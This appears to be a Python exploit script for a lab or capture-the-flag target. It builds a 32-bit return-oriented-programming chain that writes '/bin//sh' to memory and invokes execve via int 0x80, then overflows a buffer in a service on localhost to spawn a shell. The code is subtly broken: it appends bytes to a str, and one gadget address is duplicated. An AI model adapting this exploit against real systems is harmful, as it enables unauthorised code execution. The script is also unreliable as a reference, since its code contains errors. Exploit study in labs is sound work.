#!/usr/bin/env python3

from struct import pack
import socket
import sys
import time

p = ''

p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x08139060) # @ .data
p += pack('<I', 0x080f1016) # pop eax ; ret
p += b'/bin'
p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x08139064) # @ .data + 4
p += pack('<I', 0x080f1016) # pop eax ; ret
p += b'//sh'

p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x08139068) # @ .data + 8
p += pack('<I', 0x08048ac1) # xor eax, eax ; ret
p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481e1) # pop ebx ; ret
p += pack('<I', 0x08139060) # @ .data
p += pack('<I', 0x0812b35b) # pop ecx ; ret
p += pack('<I', 0x08139068) # @ .data + 8
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x08139068) # @ .data + 8

p += pack('<I', 0x08139068) # @ .data + 8
p += pack('<I', 0x080f1016) # pop eax ; ret
p += pack('<I', 0x0000000b)
p += pack('<I', 0x08074ded) # int 0x80


if len(sys.argv) != 2:
    sys.exit("Usage: %s PORT" % sys.argv[0])

# def send_cmd(cmd):
#     port = int(sys.argv[1])
#     sock = socket.create_connection(('127.0.0.1', port),
#                                     socket.getdefaulttimeout(),
#                                     ('127.0.0.1', 0))

#     sock.sendall(cmd.encode('utf-8'))

#     buf = bytearray()
#     while True:
#         received = sock.recv(4096)
#         if not received:
#             break
#         buf += received
#         idx = buf.rfind(b"\n")
#         if idx != -1:
#             sys.stdout.write(buf[0:idx+1].decode('utf-8', errors='replace'))
#             buf = buf[idx+1:]

#     sock.close()
#     sys.stdout.write(buf.decode('utf-8'))

sock = socket.create_connection(('127.0.0.1', int(sys.argv[1])), socket.getdefaulttimeout(), ('127.0.0.1', 0))
sock.sendall(b'?' * 1023)
time.sleep(1)
sock.sendall(b'?' * 29 + p)
sock.close()

# :vim set sw=4 ts=8 sts=8 expandtab:
